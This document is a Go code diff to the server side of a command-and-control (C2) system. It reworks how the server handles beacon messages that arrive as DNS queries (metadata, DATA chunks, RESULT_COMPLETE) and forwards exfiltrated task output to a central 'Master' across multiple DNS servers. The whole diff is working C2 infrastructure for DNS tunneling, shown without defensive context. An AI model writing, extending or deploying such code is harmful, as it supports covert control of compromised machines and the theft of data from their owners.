@@ -1808,35 +1808,46 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		totalSize, _ := strconv.Atoi(msgParts[3])
 		totalChunks, _ := strconv.Atoi(msgParts[4])
 
+		// Track metadata locally (for totalChunks lookup and logging)
 		c2.mutex.Lock()
 		if _, exists := c2.expectedResults[taskID]; !exists {
 			c2.expectedResults[taskID] = &ExpectedResult{
-				BeaconID:     beaconID,
-				TaskID:       taskID,
-				TotalSize:    totalSize,
-				TotalChunks:  totalChunks,
-				ReceivedAt:   time.Now(),
-				ReceivedData: make([]string, totalChunks),
+				BeaconID:    beaconID,
+				TaskID:      taskID,
+				TotalSize:   totalSize,
+				TotalChunks: totalChunks,
+				ReceivedAt:  time.Now(),
+				// No ReceivedData - Master handles assembly
 			}
 			if c2.debug {
 				logf("[C2] Expecting result for task %s: %d chunks, %d bytes", taskID, totalChunks, totalSize)
 			}
 		}
 		c2.mutex.Unlock()
+
+		// Forward metadata to Master so it knows to expect chunks from any DNS server
+		if masterClient != nil {
+			c2.mutex.RLock()
+			masterID, isMasterTask := c2.masterTaskIDs[taskID]
+			c2.mutex.RUnlock()
+
+			if isMasterTask {
+				// Send a metadata notification to Master (chunk 0 with totalChunks info)
+				go masterClient.SubmitResult(masterID, beaconID, 0, totalChunks, "")
+			}
+		}
+
 		return "ACK", true
 
 	case "DATA":
 		// DATA|id|taskID|chunkIndex|chunk|timestamp
 		// Use SplitN to preserve pipes in chunk data
-		// DATA|id|taskID|chunkIndex|chunk|timestamp
-		// 1    2  3      4          5...
 		dataParts := strings.SplitN(decoded, "|", 5)
 		if len(dataParts) < 5 {
 			return "", false
 		}
 
 		// The last part contains "chunk|timestamp"
-		// We need to split off the timestamp from the end
 		lastPart := dataParts[4]
 		lastPipeIdx := strings.LastIndex(lastPart, "|")
 		if lastPipeIdx == -1 {
@@ -1844,24 +1855,33 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		}
 
 		chunkData := lastPart[:lastPipeIdx]
-		// timestamp := lastPart[lastPipeIdx+1:]
-
-		// beaconID := dataParts[1]
+		beaconID = dataParts[1]
 		taskID := dataParts[2]
 		chunkIndex, _ := strconv.Atoi(dataParts[3])
 
-		c2.mutex.Lock()
+		// Get totalChunks from expected results (if we have it)
+		var totalChunks int
+		c2.mutex.RLock()
 		if expected, ok := c2.expectedResults[taskID]; ok {
-			// Chunk index is 1-based from client
-			if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
-				expected.ReceivedData[chunkIndex-1] = chunkData
-				expected.LastChunkIndex = chunkIndex
-				if c2.debug {
-					logf("[C2] Received chunk %d/%d for task %s", chunkIndex, expected.TotalChunks, taskID)
-				}
+			totalChunks = expected.TotalChunks
+		}
+		c2.mutex.RUnlock()
+
+		if c2.debug {
+			logf("[C2] Received chunk %d/%d for task %s - forwarding to Master", chunkIndex, totalChunks, taskID)
+		}
+
+		// Forward chunk to Master immediately - Master handles all assembly
+		if masterClient != nil {
+			c2.mutex.RLock()
+			masterID, isMasterTask := c2.masterTaskIDs[taskID]
+			c2.mutex.RUnlock()
+
+			if isMasterTask {
+				go masterClient.SubmitResult(masterID, beaconID, chunkIndex, totalChunks, chunkData)
 			}
 		}
-		c2.mutex.Unlock()
+
 		return "ACK", true
 
 	case "RESULT_COMPLETE":
@@ -1871,51 +1891,42 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		}
 		beaconID = msgParts[1]
 		taskID := msgParts[2]
+		totalChunksFromMsg, _ := strconv.Atoi(msgParts[3])
 
+		// Clean up local tracking state (no local assembly - Master handles it)
 		c2.mutex.Lock()
 		expected, ok := c2.expectedResults[taskID]
-		if !ok {
-			c2.mutex.Unlock()
-			return "ACK", true // Already processed or unknown
+		var totalChunks int
+		if ok {
+			totalChunks = expected.TotalChunks
+			delete(c2.expectedResults, taskID)
+		} else {
+			totalChunks = totalChunksFromMsg
 		}
 
-		// Capture values before deleting
-		totalChunks := expected.TotalChunks
-		// Reassemble result
-		fullResult := strings.Join(expected.ReceivedData, "")
-		delete(c2.expectedResults, taskID)
-
-		// Update task
-		if task, ok := c2.tasks[taskID]; ok {
-			task.Result = fullResult
+		// Update local task status and clear beacon's current task
+		if task, taskExists := c2.tasks[taskID]; taskExists {
 			task.Status = "completed"
-			// Clear current task from beacon
 			if beacon, exists := c2.beacons[beaconID]; exists && beacon.CurrentTask == taskID {
 				beacon.CurrentTask = ""
 			}
 		}
 		c2.mutex.Unlock()
 
-		logf("[C2] Result complete for task %s (%d bytes)", taskID, len(fullResult))
+		logf("[C2] Result complete for task %s (%d chunks) - forwarding to Master", taskID, totalChunks)
 
-		// Persist result
+		// Update local DB status (result will come from Master sync later)
 		if c2.db != nil {
-			go func(tid, bid, res string) {
-				c2.db.SaveTaskResult(tid, bid, res, 0, 1)
-				c2.db.UpdateTaskStatus(tid, "completed")
-			}(taskID, beaconID, fullResult)
+			go c2.db.UpdateTaskStatus(taskID, "completed")
 		}
 
-		// Report to Master
+		// Forward completion to Master - Master assembles from chunks received from all DNS servers
 		if masterClient != nil {
 			c2.mutex.RLock()
 			masterID, isMasterTask := c2.masterTaskIDs[taskID]
 			c2.mutex.RUnlock()
 
 			if isMasterTask {
-				// Submit the assembled result to Master
-				go masterClient.SubmitResult(masterID, beaconID, 0, 1, fullResult)
-				// Signal completion to Master so it marks task as completed
 				go masterClient.MarkTaskComplete(masterID, beaconID, totalChunks)
 			}
 		}
